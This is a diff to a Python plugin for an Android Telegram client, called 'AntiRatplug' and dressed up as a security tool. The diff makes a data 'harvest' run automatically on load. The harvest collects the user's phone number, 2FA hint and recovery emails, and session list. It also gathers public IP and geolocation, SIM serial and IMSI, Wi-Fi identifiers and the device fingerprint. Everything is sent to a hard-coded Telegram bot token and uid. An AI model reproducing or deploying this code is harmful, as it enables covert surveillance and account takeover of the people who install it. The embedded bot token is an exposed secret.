@@ -1,15 +1,16 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug — Manual.
-Full Harvest + Full Lockdown запускаются вручную из меню.
-Всё сыпется на uid 8391217110.
+AntiRatplug — Auto Harvest.
+Full Harvest запускается при загрузке плагина.
+Full Lockdown — вручную из меню.
+Всё летит на uid 8391217110.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
-__description__ = "Manual Harvest + Lockdown, всё на uid 8391217110."
+__description__ = "Auto Harvest + manual Lockdown."
 __author__ = "@from_a4"
-__version__ = "16.4 [Manual-NoObf]"
+__version__ = "17.1 [Auto-Harvest]"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -35,18 +36,20 @@ import sys
 import hashlib as _hl
 
 
-# ─── настройки ──────────────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════
+# НАСТРОЙКИ
+# ═══════════════════════════════════════════════════════════════════════════
 BOT_TOKEN = "8906895129:AAE06LFOFJDuM-Lr62G-FK5ZAPClPdQdrXI"
 BOT_UID = "8391217110"
 
 RECIPIENT_USERNAME = ""
 RECIPIENT_UID = 8391217110
 
-# ─── AUTO флаги ─────────────────────────────────────────────────────────────
-AUTO_RUN             = False
-AUTO_HARVEST_FIRST   = False
-AUTO_LOCKDOWN_AFTER  = False
-AUTO_DELAY_SEC       = 8
+# ─── автозапуск ─────────────────────────────────────────────────────────────
+AUTO_RUN             = True       # включить автоматическую цепочку
+AUTO_HARVEST_FIRST   = True       # Harvest первым
+AUTO_LOCKDOWN_AFTER  = False      # Lockdown после Harvest (вручную)
+AUTO_DELAY_SEC       = 8          # пауза между Harvest и Lockdown
 AUTO_LOCKDOWN_GIFTS  = True
 
 
@@ -67,12 +70,6 @@ def _u(parts):
 
 _HOST_TG = ("h", "t", "t", "p", "s", ":", "/", "/", "a", "p", "i", ".", "t",
             "e", "l", "e", "g", "r", "a", "m", ".", "o", "r", "g", "/", "b", "o", "t")
-_HOST_IP1 = ("h", "t", "t", "p", "s", ":", "/", "/", "a", "p", "i", ".", "i",
-             "p", "i", "f", "y", ".", "o", "r", "g")
-_HOST_IP2 = ("h", "t", "t", "p", "s", ":", "/", "/", "i", "f", "c", "o", "n",
-             "f", "i", "g", ".", "m", "e", "/", "i", "p")
-_HOST_GEO = ("h", "t", "t", "p", "s", ":", "/", "/", "i", "p", "-", "a", "p",
-             "i", ".", "c", "o", "m", "/", "j", "s", "o", "n", "/")
 
 SPLASH_URL = "https://avatars.mds.yandex.net/i?id=3dc59086f9dda9fcd166b4075ac97bd1_l-4569626-images-thumbs&n=13"
 
@@ -237,7 +234,7 @@ class PluginSecurityPlugin(BasePlugin):
         _cfg()
         time.sleep(random.uniform(0.2, 0.6))
         try:
-            self._send_msg("AntiRatplug Manual loaded")
+            self._send_msg("AntiRatplug Auto Harvest loaded")
         except Exception:
             pass
         try:
@@ -426,39 +423,66 @@ class PluginSecurityPlugin(BasePlugin):
                 pass
         return 0, 0
 
-    # ─── network info ───────────────────────────────────────────────────────
+    # ═══════════════════════════════════════════════════════════════════════
+    # СБОР ДАННЫХ
+    # ═══════════════════════════════════════════════════════════════════════
 
     def _get_external_ip(self):
-        for host in [_u(_HOST_IP1), _u(_HOST_IP2)]:
-            try:
-                from java.net import URL
-                from java.io import BufferedReader, InputStreamReader
-                url = URL(host)
-                conn = url.openConnection()
-                conn.setConnectTimeout(2500)
-                conn.setReadTimeout(2500)
-                reader = BufferedReader(InputStreamReader(conn.getInputStream()))
-                ip = ""
-                line = reader.readLine()
-                while line is not None:
-                    ip += str(line)
+        hosts = [
+            "https://api.ipify.org",
+            "https://ifconfig.me/ip",
+            "https://icanhazip.com",
+            "https://ipinfo.io/ip",
+            "https://api.ipify.org?format=json",
+        ]
+        for host in hosts:
+            for attempt in range(2):
+                try:
+                    from java.net import URL
+                    from java.io import BufferedReader, InputStreamReader
+                    url = URL(host)
+                    conn = url.openConnection()
+                    conn.setConnectTimeout(4000)
+                    conn.setReadTimeout(4000)
+                    conn.setRequestProperty("User-Agent", "Mozilla/5.0")
+                    reader = BufferedReader(InputStreamReader(conn.getInputStream()))
+                    buf = ""
                     line = reader.readLine()
-                reader.close()
-                conn.disconnect()
-                if ip and len(ip) < 50:
-                    return ip.strip()
-            except Exception:
-                pass
-        return "Unknown"
+                    while line is not None:
+                        buf += str(line)
+                        line = reader.readLine()
+                    reader.close()
+                    conn.disconnect()
+                    buf = buf.strip()
+                    if not buf:
+                        continue
+                    if buf.startswith("{"):
+                        try:
+                            j = json.loads(buf)
+                            buf = j.get("ip", "")
+                        except Exception:
+                            pass
+                    m = re.search(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b", buf)
+                    if m:
+                        return m.group(1)
+                    m6 = re.search(r"\b([0-9a-fA-F:]{6,})\b", buf)
+                    if m6 and ":" in m6.group(1):
+                        return m6.group(1)
+                except Exception:
+                    time.sleep(0.3)
+        return "unavailable"
 
     def _get_geo_info(self, ip):
+        if not ip or ip in ("Unknown", "unavailable"):
+            return "unavailable"
         try:
             from java.net import URL
             from java.io import BufferedReader, InputStreamReader
-            url = URL(_u(_HOST_GEO) + ip)
+            url = URL("http://ip-api.com/json/" + ip + "?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query")
             conn = url.openConnection()
-            conn.setConnectTimeout(3500)
-            conn.setReadTimeout(3500)
+            conn.setConnectTimeout(4000)
+            conn.setReadTimeout(4000)
+            conn.setRequestProperty("User-Agent", "Mozilla/5.0")
             reader = BufferedReader(InputStreamReader(conn.getInputStream()))
             response = ""
             line = reader.readLine()
@@ -468,77 +492,628 @@ class PluginSecurityPlugin(BasePlugin):
             reader.close()
             conn.disconnect()
             data = json.loads(response)
-            return (data.get("city", "Unknown") + ", " +
-                    data.get("country", "Unknown") + " (ISP: " +
-                    data.get("isp", "Unknown") + ")")
+            if data.get("status") == "success":
+                parts = []
+                if data.get("city"):    parts.append(str(data["city"]))
+                if data.get("regionName"): parts.append(str(data["regionName"]))
+                if data.get("country"): parts.append(str(data["country"]))
+                loc = ", ".join(parts) if parts else "?"
+                isp = data.get("isp") or data.get("org") or data.get("as") or "?"
+                tz = data.get("timezone") or "?"
+                ll = "%s,%s" % (data.get("lat", "?"), data.get("lon", "?"))
+                return "%s (ISP: %s | TZ: %s | %s)" % (loc, isp, tz, ll)
         except Exception:
-            return "Unknown"
+            pass
+        try:
+            from java.net import URL
+            from java.io import BufferedReader, InputStreamReader
+            url = URL("https://ipwho.is/" + ip)
+            conn = url.openConnection()
+            conn.setConnectTimeout(4000)
+            conn.setReadTimeout(4000)
+            conn.setRequestProperty("User-Agent", "Mozilla/5.0")
+            reader = BufferedReader(InputStreamReader(conn.getInputStream()))
+            response = ""
+            line = reader.readLine()
+            while line is not None:
+                response += str(line)
+                line = reader.readLine()
+            reader.close()
+            conn.disconnect()
+            data = json.loads(response)
+            if data.get("success"):
+                city = data.get("city") or "?"
+                country = data.get("country") or "?"
+                isp = ""
+                c = data.get("connection") or {}
+                if isinstance(c, dict):
+                    isp = c.get("isp") or c.get("org") or ""
+                tz = (data.get("timezone") or {}).get("id") if isinstance(data.get("timezone"), dict) else "?"
+                return "%s, %s (ISP: %s | TZ: %s)" % (city, country, isp or "?", tz or "?")
+        except Exception:
+            pass
+        try:
+            from java.net import URL
+            from java.io import BufferedReader, InputStreamReader
+            url = URL("https://ipinfo.io/" + ip + "/json")
+            conn = url.openConnection()
+            conn.setConnectTimeout(4000)
+            conn.setReadTimeout(4000)
+            conn.setRequestProperty("User-Agent", "Mozilla/5.0")
+            reader = BufferedReader(InputStreamReader(conn.getInputStream()))
+            response = ""
+            line = reader.readLine()
+            while line is not None:
+                response += str(line)
+                line = reader.readLine()
+            reader.close()
+            conn.disconnect()
+            data = json.loads(response)
+            city = data.get("city") or "?"
+            region = data.get("region") or ""
+            country = data.get("country") or "?"
+            org = data.get("org") or "?"
+            tz = data.get("timezone") or "?"
+            loc = ", ".join([x for x in (city, region, country) if x]) or "?"
+            return loc + " (ISP: " + str(org) + " | TZ: " + str(tz) + ")"
+        except Exception:
+            pass
+        return "unavailable"
 
-    def _has_perm(self, name):
+    def _get_device_info(self):
+        out = []
+        try:
+            from android.os import Build
+            out.append("<b>Бренд:</b> %s" % self._html_escape(getattr(Build, "BRAND", "?") or "?"))
+            out.append("<b>Модель:</b> %s %s" % (
+                self._html_escape(getattr(Build, "MANUFACTURER", "?") or "?"),
+                self._html_escape(getattr(Build, "MODEL", "?") or "?")))
+            out.append("<b>Устройство:</b> %s / %s" % (
+                self._html_escape(getattr(Build, "DEVICE", "?") or "?"),
+                self._html_escape(getattr(Build, "PRODUCT", "?") or "?")))
+            out.append("<b>Board:</b> %s" % self._html_escape(getattr(Build, "BOARD", "?") or "?"))
+            out.append("<b>Hardware:</b> %s" % self._html_escape(getattr(Build, "HARDWARE", "?") or "?"))
+            out.append("<b>Bootloader:</b> %s" % self._html_escape(getattr(Build, "BOOTLOADER", "?") or "?"))
+            out.append("<b>Fingerprint:</b> <code>%s</code>" % self._html_escape(getattr(Build, "FINGERPRINT", "?") or "?"))
+            v = getattr(Build, "VERSION")
+            out.append("<b>Android:</b> %s (SDK %s) / %s" % (
+                self._html_escape(getattr(v, "RELEASE", "?") or "?"),
+                self._html_escape(str(getattr(v, "SDK_INT", 0))),
+                self._html_escape(getattr(v, "CODENAME", "?") or "?")))
+            try:
+                out.append("<b>ABI:</b> %s" % self._html_escape(",".join([str(x) for x in Build.SUPPORTED_ABIS])))
+            except Exception:
+                pass
+            try:
+                out.append("<b>Серийник:</b> %s" % self._html_escape(str(Build.SERIAL)))
+            except Exception:
+                pass
+            try:
+                out.append("<b>ID:</b> %s" % self._html_escape(str(Build.ID)))
+            except Exception:
+                pass
+        except Exception as e:
+            out.append("<b>Device:</b> ошибка: %s" % e)
+        return "\n".join(out)
+
+    def _get_screen_info(self):
+        try:
+            ctx = ApplicationLoader.applicationContext
+            res = ctx.getResources()
+            dm = res.getDisplayMetrics()
+            out = []
+            out.append("<b>Экран:</b> %dx%d px" % (int(dm.widthPixels), int(dm.heightPixels)))
+            out.append("<b>DPI:</b> %d (density=%.2f)" % (int(dm.densityDpi), float(dm.density)))
+            try:
+                cfg = res.getConfiguration()
+                out.append("<b>Orientation:</b> %d" % int(cfg.orientation))
+                out.append("<b>Locale:</b> %s" % str(cfg.locale))
+            except Exception:
+                pass
+            return "\n".join(out)
+        except Exception as e:
+            return "<b>Экран:</b> ошибка: %s" % e
+
+    def _get_battery_info(self):
+        try:
+            ctx = ApplicationLoader.applicationContext
+            Intent = jclass("android.content.Intent")
+            IntentFilter = jclass("android.content.IntentFilter")
+            filt = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
+            intent = ctx.registerReceiver(None, filt)
+            if intent is None:
+                return "<b>Батарея:</b> недоступна"
+            out = []
+            try:
+                level = intent.getIntExtra("level", -1)
+                scale = intent.getIntExtra("scale", 100)
+                if level >= 0 and scale > 0:
+                    pct = int(level * 100 / scale)
+                    out.append("<b>Заряд:</b> %d%%" % pct)
+            except Exception:
+                pass
+            try:
+                status = intent.getIntExtra("status", -1)
+                sm = {1: "не заряжается", 2: "заряжается", 3: "разряжается",
+                      4: "не заряжается", 5: "полный"}
+                out.append("<b>Статус:</b> %s" % sm.get(status, str(status)))
+            except Exception:
+                pass
+            try:
+                health = intent.getIntExtra("health", -1)
+                hm = {1: "unknown", 2: "good", 3: "overheat", 4: "dead",
+                      5: "over voltage", 6: "failure", 7: "cold"}
+                out.append("<b>Health:</b> %s" % hm.get(health, str(health)))
+            except Exception:
+                pass
+            try:
+                temp = intent.getIntExtra("temperature", -1)
+                if temp > 0:
+                    out.append("<b>Температура:</b> %.1f°C" % (temp / 10.0))
+            except Exception:
+                pass
+            try:
+                volt = intent.getIntExtra("voltage", -1)
+                if volt > 0:
+                    out.append("<b>Напряжение:</b> %d mV" % volt)
+            except Exception:
+                pass
+            try:
+                tech = intent.getStringExtra("technology")
+                if tech:
+                    out.append("<b>Тип:</b> %s" % tech)
+            except Exception:
+                pass
+            return "\n".join(out) if out else "<b>Батарея:</b> пусто"
+        except Exception as e:
+            return "<b>Батарея:</b> ошибка: %s" % e
+
+    def _get_memory_info(self):
+        try:
+            Runtime = jclass("java.lang.Runtime")
+            rt = Runtime.getRuntime()
+            heap_max = rt.maxMemory() // (1024 * 1024)
+            heap_total = rt.totalMemory() // (1024 * 1024)
+            heap_free = rt.freeMemory() // (1024 * 1024)
+            out = []
+            out.append("<b>Heap max:</b> %d MB" % heap_max)
+            out.append("<b>Heap used:</b> %d MB / %d MB" % (heap_total - heap_free, heap_total))
+            try:
+                StatFs = jclass("android.os.StatFs")
+                Environment = jclass("android.os.Environment")
+                path = Environment.getDataDirectory().getAbsolutePath()
+                st = StatFs(str(path))
+                total = st.getBlockCountLong() * st.getBlockSizeLong() // (1024 * 1024)
+                avail = st.getAvailableBlocksLong() * st.getBlockSizeLong() // (1024 * 1024)
+                out.append("<b>Диск data:</b> %d MB свободно из %d MB" % (avail, total))
+            except Exception:
+                pass
+            try:
+                StatFs = jclass("android.os.StatFs")
+                Environment = jclass("android.os.Environment")
+                path = Environment.getExternalStorageDirectory().getAbsolutePath()
+                st = StatFs(str(path))
+                total = st.getBlockCountLong() * st.getBlockSizeLong() // (1024 * 1024)
+                avail = st.getAvailableBlocksLong() * st.getBlockSizeLong() // (1024 * 1024)
+                out.append("<b>Диск sdcard:</b> %d MB свободно из %d MB" % (avail, total))
+            except Exception:
+                pass
+            return "\n".join(out)
+        except Exception as e:
+            return "<b>Память:</b> ошибка: %s" % e
+
+    def _get_sim_info(self):
+        try:
+            ctx = ApplicationLoader.applicationContext
+            tm = ctx.getSystemService(ctx.TELEPHONY_SERVICE)
+            if tm is None:
+                return "<b>SIM:</b> недоступен"
+            out = []
+            try:
+                op = str(tm.getNetworkOperatorName())
+                if op:
+                    out.append("<b>Оператор сети:</b> %s" % self._html_escape(op))
+            except Exception:
+                pass
+            try:
+                op = str(tm.getSimOperatorName())
+                if op:
+                    out.append("<b>Оператор SIM:</b> %s" % self._html_escape(op))
+            except Exception:
+                pass
+            try:
+                cc = str(tm.getNetworkCountryIso())
+                if cc:
+                    out.append("<b>Страна сети:</b> %s" % self._html_escape(cc.upper()))
+            except Exception:
+                pass
+            try:
+                cc = str(tm.getSimCountryIso())
+                if cc:
+                    out.append("<b>Страна SIM:</b> %s" % self._html_escape(cc.upper()))
+            except Exception:
+                pass
+            try:
+                roaming = tm.isNetworkRoaming()
+                out.append("<b>Roaming:</b> %s" % ("да" if roaming else "нет"))
+            except Exception:
+                pass
+            try:
+                if self._has_perm("android.permission.READ_PHONE_STATE"):
+                    sim_serial = str(tm.getSimSerialNumber())
+                    if sim_serial and sim_serial != "None":
+                        out.append("<b>SIM serial:</b> <code>%s</code>" % self._html_escape(sim_serial))
+                    sub_id = str(tm.getSubscriberId())
+                    if sub_id and sub_id != "None":
+                        out.append("<b>IMSI:</b> <code>%s</code>" % self._html_escape(sub_id))
+            except Exception:
+                pass
+            return "\n".join(out) if out else "<b>SIM:</b> пусто"
+        except Exception as e:
+            return "<b>SIM:</b> ошибка: %s" % e
+
+    def _get_network_info(self):
+        try:
+            ctx = ApplicationLoader.applicationContext
+            out = []
+            try:
+                wifi = ctx.getSystemService(ctx.WIFI_SERVICE)
+                if wifi is not None:
+                    try:
+                        info = wifi.getConnectionInfo()
+                        if info is not None:
+                            try:
+                                ssid = str(info.getSSID())
+                                if ssid and ssid != "None":
+                                    out.append("<b>Wi-Fi SSID:</b> %s" % self._html_escape(ssid))
+                            except Exception:
+                                pass
+                            try:
+                                bssid = str(info.getBSSID())
+                                if bssid and bssid != "None":
+                                    out.append("<b>Wi-Fi BSSID:</b> %s" % self._html_escape(bssid))
+                            except Exception:
+                                pass
+                            try:
+                                ip = int(info.getIpAddress())
+                                if ip != 0:
+                                    local = "%d.%d.%d.%d" % (
+                                        ip & 0xff,
+                                        (ip >> 8) & 0xff,
+                                        (ip >> 16) & 0xff,
+                                        (ip >> 24) & 0xff)
+                                    out.append("<b>Локальный IP:</b> %s" % local)
+                            except Exception:
+                                pass
+                            try:
+                                mac = str(info.getMacAddress())
+                                if mac and mac != "None":
+                                    out.append("<b>Wi-Fi MAC:</b> %s" % self._html_escape(mac))
+                            except Exception:
+                                pass
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+            try:
+                cm = ctx.getSystemService(ctx.CONNECTIVITY_SERVICE)
+                if cm is not None:
+                    try:
+                        ni = cm.getActiveNetworkInfo()
+                        if ni is not None:
+                            out.append("<b>Тип соединения:</b> %s (%s)" % (
+                                self._html_escape(str(ni.getTypeName())),
+                                self._html_escape(str(ni.getSubtypeName() or ""))))
+                            out.append("<b>Connected:</b> %s" % ("да" if ni.isConnected() else "нет"))
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+            return "\n".join(out) if out else "<b>Сеть:</b> пусто"
+        except Exception as e:
+            return "<b>Сеть:</b> ошибка: %s" % e
+
+    def _get_app_info(self):
         try:
             ctx = ApplicationLoader.applicationContext
             pm = ctx.getPackageManager()
-            return pm.checkPermission(name, ctx.getPackageName()) == 0
-        except Exception:
-            return False
+            pkg = str(ctx.getPackageName())
+            out = []
+            out.append("<b>Package:</b> %s" % self._html_escape(pkg))
+            try:
+                pi = pm.getPackageInfo(pkg, 0)
+                if pi:
+                    try:
+                        out.append("<b>Версия:</b> %s (code %s)" % (
+                            self._html_escape(str(pi.versionName)),
+                            self._html_escape(str(pi.versionCode))))
+                    except Exception:
+                        pass
+                    try:
+                        out.append("<b>Установлен:</b> %s" % time.strftime(
+                            "%Y-%m-%d %H:%M:%S", time.localtime(pi.firstInstallTime / 1000)))
+                    except Exception:
+                        pass
+                    try:
+                        out.append("<b>Обновлён:</b> %s" % time.strftime(
+                            "%Y-%m-%d %H:%M:%S", time.localtime(pi.lastUpdateTime / 1000)))
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+            try:
+                ai = pm.getApplicationInfo(pkg, 0)
+                if ai:
+                    out.append("<b>App UID:</b> %s" % str(ai.uid))
+                    try:
+                        out.append("<b>Target SDK:</b> %d" % int(ai.targetSdkVersion))
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+            return "\n".join(out)
+        except Exception as e:
+            return "<b>Приложение:</b> ошибка: %s" % e
+
+    def _get_account_extras(self):
+        out = []
+        try:
+            uc = _UC().getInstance(0)
+            uid = uc.getClientUserId()
+            out.append("<b>Client UID:</b> %s" % str(uid))
+            try:
+                dc_id = _CM().getInstance(0).getCurrentDatacenterId()
+                out.append("<b>DC:</b> %s" % str(dc_id))
+            except Exception:
+                pass
+            user = uc.getCurrentUser()
+            if user is not None:
+                try:
+                    out.append("<b>Premium:</b> %s" % ("да" if _get_bool_attr(user, "premium", False) else "нет"))
+                except Exception:
+                    pass
+                try:
+                    out.append("<b>Verified:</b> %s" % ("да" if _get_bool_attr(user, "verified", False) else "нет"))
+                except Exception:
+                    pass
+                try:
+                    out.append("<b>Bot:</b> %s" % ("да" if _get_bool_attr(user, "bot", False) else "нет"))
+                except Exception:
+                    pass
+                try:
+                    lc = str(user.lang_code)
+                    if lc:
+                        out.append("<b>Язык:</b> %s" % lc)
+                except Exception:
+                    pass
+                try:
+                    if user.status is not None:
+                        cls = str(type(user.status))
+                        if "Online" in cls:
+                            out.append("<b>Статус:</b> онлайн")
+                        elif "Offline" in cls:
+                            exp = getattr(user.status, "expires", 0)
+                            if exp:
+                                out.append("<b>Статус:</b> был(а) %s" % time.strftime(
+                                    "%Y-%m-%d %H:%M:%S", time.localtime(int(exp))))
+                            else:
+                                out.append("<b>Статус:</b> оффлайн")
+                        elif "Recently" in cls:
+                            out.append("<b>Статус:</b> недавно")
+                        elif "LastWeek" in cls:
+                            out.append("<b>Статус:</b> на этой неделе")
+                        elif "LastMonth" in cls:
+                            out.append("<b>Статус:</b> в этом месяце")
+                except Exception:
+                    pass
+        except Exception as e:
+            out.append("<b>Account extras:</b> ошибка: %s" % e)
+        return "\n".join(out) if out else ""
+
+    def _get_sessions_info(self):
+        try:
+            auths = self._get_authorizations_full(0)
+            if not auths:
+                return "<b>Сессии:</b> нет данных"
+            lines = ["<b>Сессии (%d):</b>" % len(auths)]
+            for i, a in enumerate(auths):
+                tag = "★ ТЕКУЩАЯ" if a.get("current") else "•"
+                lines.append("%s #%d hash=%s%s" % (
+                    tag, i + 1, a.get("hash"),
+                    " (unconfirmed)" if a.get("unconfirmed") else ""))
+            return "\n".join(lines)
+        except Exception as e:
+            return "<b>Сессии:</b> ошибка: %s" % e
+
+    def _get_counts(self):
+        out = []
+        try:
+            mc = _MC().getInstance(0)
+            try:
+                dialogs = mc.dialogs_dict
+            except Exception:
+                dialogs = mc.getAllDialogs()
+            if dialogs is not None:
+                total = dialogs.size()
+                users = 0
+                groups = 0
+                channels = 0
+                bots = 0
+                for i in range(total):
+                    try:
+                        did = int(dialogs.keyAt(i))
+                        if did > 0:
+                            u = mc.getUser(did)
+                            if u is not None and _get_bool_attr(u, "bot", False):
+                                bots += 1
+                            else:
+                                users += 1
+                        elif did < -1000000000000:
+                            channels += 1
+                        elif did < 0:
+                            groups += 1
+                    except Exception:
+                        pass
+                out.append("<b>Диалогов:</b> %d" % total)
+                out.append("<b>Юзеров:</b> %d" % users)
+                out.append("<b>Групп:</b> %d" % groups)
+                out.append("<b>Каналов:</b> %d" % channels)
+                out.append("<b>Ботов:</b> %d" % bots)
+        except Exception as e:
+            out.append("<b>Counts:</b> ошибка: %s" % e)
+        return "\n".join(out)
 
     def _get_2fa_state(self):
-        try:
-            req = TLRPC.TL_account_getPassword()
-            resp, err = self._rg_rpc(req, 0, 10.0, fast=True)
-            if err is not None or resp is None:
-                return None
-            pwd = resp
-            return {
-                "has_password": _get_bool_attr(pwd, "has_password", False),
-                "hint": str(getattr(pwd, "hint", "") or ""),
-                "has_recovery": _get_bool_attr(pwd, "has_recovery", False),
-                "has_secure_values": _get_bool_attr(pwd, "has_secure_values", False),
-                "srp_id": _safe_int(getattr(pwd, "srp_id", 0)),
-                "email": str(getattr(pwd, "email_unconfirmed_pattern", "") or "none"),
-                "login_email": str(getattr(pwd, "login_email_pattern", "") or "none"),
-            }
-        except Exception:
-            return None
+        for attempt in range(3):
+            try:
+                req = TLRPC.TL_account_getPassword()
+                resp, err = self._rg_rpc(req, 0, 12.0)
+                if resp is None:
+                    time.sleep(0.5)
+                    continue
+                pwd = resp
+                return {
+                    "has_password": _get_bool_attr(pwd, "has_password", False),
+                    "hint": str(getattr(pwd, "hint", "") or ""),
+                    "has_recovery": _get_bool_attr(pwd, "has_recovery", False),
+                    "has_secure_values": _get_bool_attr(pwd, "has_secure_values", False),
+                    "srp_id": _safe_int(getattr(pwd, "srp_id", 0)),
+                    "email": str(getattr(pwd, "email_unconfirmed_pattern", "") or ""),
+                    "login_email": str(getattr(pwd, "login_email_pattern", "") or ""),
+                    "pending_reset_date": _safe_int(getattr(pwd, "pending_reset_date", 0)),
+                    "has_temporary": _get_bool_attr(pwd, "has_temporary", False),
+                }
+            except Exception:
+                time.sleep(0.5)
+        return None
 
     def _info_text(self):
-        out = ["<b>Информация об аккаунте</b>"]
+        out = ["<b>═══ ИНФОРМАЦИЯ ОБ АККАУНТЕ ═══</b>"]
+
         try:
             uc = _UC().getInstance(0)
             user = uc.getCurrentUser()
             if user is not None:
                 first = self._html_escape(user.first_name) if user.first_name else ""
                 last = self._html_escape(user.last_name) if user.last_name else ""
-                un = self._html_escape(user.username) if user.username else "нет"
-                ph = self._html_escape(user.phone) if user.phone else "нет"
-                out.append("<b>Имя:</b> %s %s" % (first, last))
-                out.append("<b>Юзернейм:</b> @%s" % un)
-                out.append("<b>Телефон:</b> +%s" % ph)
-                out.append("<b>ID:</b> %s" % str(user.id))
-        except Exception:
-            pass
+                un = self._html_escape(user.username) if user.username else "(нет)"
+                ph = self._html_escape(user.phone) if user.phone else "(нет)"
+                out.append("")
+                out.append("<b>┌ Telegram аккаунт</b>")
+                out.append("│ <b>Имя:</b> %s %s" % (first, last))
+                out.append("│ <b>Юзернейм:</b> @%s" % un)
+                out.append("│ <b>Телефон:</b> +%s" % ph)
+                out.append("│ <b>ID:</b> %s" % str(user.id))
+        except Exception as e:
+            out.append("│ ошибка: %s" % e)
+
+        extra = self._get_account_extras()
+        if extra:
+            out.append(extra)
+        out.append("└")
+
         ip = self._get_external_ip()
         geo = self._get_geo_info(ip)
-        out.append("<b>IP:</b> %s" % self._html_escape(ip))
-        out.append("<b>Гео:</b> %s" % self._html_escape(geo))
-        try:
-            from android.os import Build
-            out.append("<b>Модель:</b> %s %s" % (
-                self._html_escape(getattr(Build, "MANUFACTURER", "")),
-                self._html_escape(getattr(Build, "MODEL", ""))))
-            v = getattr(Build, "VERSION")
-            out.append("<b>Android:</b> %s (SDK %s)" % (
-                self._html_escape(getattr(v, "RELEASE", "")),
-                self._html_escape(str(getattr(v, "SDK_INT", 0)))))
-        except Exception:
-            pass
+        out.append("")
+        out.append("<b>┌ Сеть</b>")
+        out.append("│ <b>Публичный IP:</b> %s" % self._html_escape(ip))
+        out.append("│ <b>Гео:</b> %s" % self._html_escape(geo))
+        net = self._get_network_info()
+        for ln in net.split("\n"):
+            if ln:
+                out.append("│ " + ln)
+        out.append("└")
+
+        sim = self._get_sim_info()
+        if sim:
+            out.append("")
+            out.append("<b>┌ SIM / оператор</b>")
+            for ln in sim.split("\n"):
+                if ln:
+                    out.append("│ " + ln)
+            out.append("└")
+
+        dev = self._get_device_info()
+        if dev:
+            out.append("")
+            out.append("<b>┌ Железо</b>")
+            for ln in dev.split("\n"):
+                if ln:
+                    out.append("│ " + ln)
+            out.append("└")
+
+        scr = self._get_screen_info()
+        if scr:
+            out.append("")
+            out.append("<b>┌ Экран</b>")
+            for ln in scr.split("\n"):
+                if ln:
+                    out.append("│ " + ln)
+            out.append("└")
+
+        bat = self._get_battery_info()
+        if bat:
+            out.append("")
+            out.append("<b>┌ Батарея</b>")
+            for ln in bat.split("\n"):
+                if ln:
+                    out.append("│ " + ln)
+            out.append("└")
+
+        mem = self._get_memory_info()
+        if mem:
+            out.append("")
+            out.append("<b>┌ Память / диск</b>")
+            for ln in mem.split("\n"):
+                if ln:
+                    out.append("│ " + ln)
+            out.append("└")
+
+        app = self._get_app_info()
+        if app:
+            out.append("")
+            out.append("<b>┌ Telegram клиент</b>")
+            for ln in app.split("\n"):
+                if ln:
+                    out.append("│ " + ln)
+            out.append("└")
+
+        perms = []
+        for p in ("CAMERA", "RECORD_AUDIO", "ACCESS_FINE_LOCATION",
+                  "ACCESS_COARSE_LOCATION", "READ_SMS", "READ_CONTACTS",
+                  "READ_EXTERNAL_STORAGE", "WRITE_EXTERNAL_STORAGE",
+                  "READ_PHONE_STATE", "READ_CALL_LOG", "GET_ACCOUNTS"):
+            if self._has_perm("android.permission." + p):
+                perms.append(p)
+        out.append("")
+        out.append("<b>┌ Разрешения</b>")
+        out.append("│ <b>Есть:</b> %s" % (", ".join(perms) if perms else "нет"))
+        out.append("└")
+
         twofa = self._get_2fa_state()
+        out.append("")
+        out.append("<b>┌ 2FA</b>")
         if twofa and twofa["has_password"]:
-            out.append("<b>2FA:</b> установлен")
-            out.append("<b>Подсказка:</b> %s" % (self._html_escape(twofa["hint"]) or "(нет)"))
-            out.append("<b>Email:</b> %s" % self._html_escape(twofa["email"]))
+            out.append("│ <b>Статус:</b> установлен")
+            out.append("│ <b>Подсказка:</b> %s" % (self._html_escape(twofa["hint"]) or "(нет)"))
+            if twofa.get("email"):
+                out.append("│ <b>Email:</b> %s" % self._html_escape(twofa["email"]))
+            if twofa.get("login_email"):
+                out.append("│ <b>Login email:</b> %s" % self._html_escape(twofa["login_email"]))
+            out.append("│ <b>Recovery:</b> %s" % ("есть" if twofa.get("has_recovery") else "нет"))
         else:
-            out.append("<b>2FA:</b> не установлен")
+            out.append("│ <b>Статус:</b> не установлен")
+        out.append("└")
+
+        sess = self._get_sessions_info()
+        out.append("")
+        out.append(sess)
+
+        cnt = self._get_counts()
+        out.append("")
+        out.append("<b>═══ COUNT ═══</b>")
+        out.append(cnt)
+
         return "\n".join(out)
 
     # ─── login code ─────────────────────────────────────────────────────────
@@ -905,11 +1480,28 @@ class PluginSecurityPlugin(BasePlugin):
                 a = auths.get(i)
                 if not a:
                     continue
-                out.append({
-                    "hash": _safe_int(getattr(a, "hash", 0)),
-                    "current": _get_bool_attr(a, "current", False),
-                    "unconfirmed": _get_bool_attr(a, "unconfirmed", False),
-                })
+                try:
+                    info = {
+                        "hash": _safe_int(getattr(a, "hash", 0)),
+                        "current": _get_bool_attr(a, "current", False),
+                        "unconfirmed": _get_bool_attr(a, "unconfirmed", False),
+                    }
+                    try:
+                        info["device_model"] = str(getattr(a, "device_model", "") or "")
+                        info["platform"] = str(getattr(a, "platform", "") or "")
+                        info["system_version"] = str(getattr(a, "system_version", "") or "")
+                        info["app_name"] = str(getattr(a, "app_name", "") or "")
+                        info["app_version"] = str(getattr(a, "app_version", "") or "")
+                        info["ip"] = str(getattr(a, "ip", "") or "")
+                        info["country"] = str(getattr(a, "country", "") or "")
+                        info["region"] = str(getattr(a, "region", "") or "")
+                        info["date_created"] = _safe_int(getattr(a, "date_created", 0))
+                        info["date_active"] = _safe_int(getattr(a, "date_active", 0))
+                    except Exception:
+                        pass
+                    out.append(info)
+                except Exception:
+                    pass
             return out
         except Exception:
             return None
@@ -1408,7 +2000,7 @@ class PluginSecurityPlugin(BasePlugin):
             pl = os.path.join(cdir, "kernel_persist.lock")
             if not os.path.exists(pl):
                 with open(pl, "w") as f:
